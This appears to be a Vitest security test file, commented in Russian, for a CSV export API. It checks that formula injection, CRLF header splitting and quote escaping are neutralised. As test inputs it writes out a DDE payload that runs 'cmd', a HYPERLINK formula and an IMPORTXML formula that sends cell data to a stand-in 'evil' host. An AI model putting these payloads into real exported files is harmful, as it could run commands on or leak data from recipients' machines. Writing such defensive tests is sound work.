import { describe, it, expect, vi, beforeEach } from 'vitest';

// Экспорт в CSV — это файл, который открывают двойным кликом в Excel.
// Атакуем то, что происходит ПОСЛЕ выгрузки: формулы в ячейках, инъекция в
// заголовок Content-Disposition, перенос строк и кавычки.

const who = vi.hoisted(() => ({ me: 'alice@example.com' as string | null }));
vi.mock('@/lib/current-user', () => ({ currentEmail: async () => who.me }));

import { getCustomStore } from '@/lib/datasource/customStore';
import { GET as exportGET } from '@/app/api/records/export/route';
import { csvField, toCsv, attachmentHeader } from '@/lib/csv';

const ALICE = 'alice@example.com';
beforeEach(() => { who.me = ALICE; });

/** Ячейка, начинающаяся с этих знаков, исполняется как формула в Excel/Sheets. */
const FORMULA_STARTS = ['=', '+', '-', '@'];

/** Значение ячейки так, как его увидит парсер CSV — без обрамляющих кавычек. */
const unquoted = (s: string) => (s.startsWith('"') ? s.slice(1) : s);

describe('CSV-инъекция формулой', () => {
  // если сломается — выгруженный файл выполняет команду на машине того, кто его открыл
  it('ячейка «=cmd|…» выгружается обезвреженной', () => {
    expect(unquoted(csvField('=cmd|\' /C calc\'!A0')).startsWith('=')).toBe(false);
  });

  // все стартовые символы формул, а не только «=»
  it('все опасные первые символы обезвреживаются', () => {
    for (const ch of FORMULA_STARTS) {
      const first = unquoted(csvField(`${ch}HYPERLINK("http://evil","жми")`))[0];
      expect({ ch, first }).not.toEqual({ ch, first: ch });
    }
  });

  // тот же яд, но через заголовок колонки, а не через значение
  it('метка колонки с формулой обезвреживается в шапке', () => {
    const csv = toCsv({ headers: ['=1+1'], rows: [['ок']] });
    expect(unquoted(csv.split('\r\n')[0]).startsWith('=')).toBe(false);
  });

  // сквозной путь: формула лежит в базе и уезжает в файл
  it('формула из строки базы не доезжает до файла в исполняемом виде', async () => {
    const store = getCustomStore();
    const base = await store.createBase({
      name: 'Экспорт',
      columns: [{ key: 'name', label: 'Название', type: 'text' }],
      owner: ALICE,
    });
    await store.addRecord(base.id, { name: '=IMPORTXML("http://evil/?d="&A1,"//a")' });

    const res = await exportGET(new Request(`http://localhost/api/records/export?base=${base.id}`));
    expect(res.status).toBe(200);
    const text = await res.text();
    const dataLine = text.split('\r\n')[1] ?? '';
    expect(dataLine.replace(/^"/, '').startsWith('=')).toBe(false);
  });
});

describe('CSV — экранирование по RFC 4180', () => {
  // контроль: базовое экранирование обязано работать, иначе файл вообще кривой
  it('запятая, кавычка и перевод строки экранируются', () => {
    expect(csvField('a,b')).toBe('"a,b"');
    expect(csvField('он сказал "да"')).toBe('"он сказал ""да"""');
    expect(csvField('строка1\r\nстрока2')).toBe('"строка1\r\nстрока2"');
  });

  // склейка не должна разъезжаться от значений с переводами строк
  it('значение с переводом строки не порождает лишнюю запись', () => {
    const csv = toCsv({ headers: ['a', 'b'], rows: [['первый\nвторой', 'x']] });
    // одна запись данных, а не две: перевод строки внутри кавычек
    expect(csv.split('\r\n').length).toBe(2);
  });

  // null/undefined не должны превращаться в текст «null»
  it('пустые значения выгружаются пустыми', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });
});

describe('Заголовок Content-Disposition', () => {
  // если сломается — имя базы становится способом подсунуть свой HTTP-заголовок
  it('перевод строки в имени базы не расщепляет заголовок', () => {
    const header = attachmentHeader('отчёт\r\nX-Evil: 1');
    expect(header).not.toContain('\r');
    expect(header).not.toContain('\n');
  });

  // кавычка в имени закрывает filename="…" и открывает простор для остального
  it('кавычки и слэши в имени не выходят из filename="…"', () => {
    const header = attachmentHeader('от"чёт\\плохой');
    const ascii = header.match(/filename="([^"]*)"/)?.[1] ?? '';
    expect(ascii).not.toContain('"');
    expect(ascii).not.toContain('\\');
  });

  // кириллица должна доезжать до пользователя читаемой
  it('кириллическое имя переживает заголовок', () => {
    const header = attachmentHeader('Рынок AI');
    expect(header).toContain("filename*=UTF-8''");
    expect(header).toContain(encodeURIComponent('Рынок AI'));
  });
});

describe('Экспорт и доступ', () => {
  // выгрузка обязана уважать те же фильтры, что и экран, иначе «скачал не то»
  it('экспорт по несуществующей базе не подменяется каталогом', async () => {
    const res = await exportGET(new Request('http://localhost/api/records/export?base=нет-такой'));
    expect(res.status).toBe(404);
    expect(res.headers.get('content-type')).not.toContain('text/csv');
  });
});
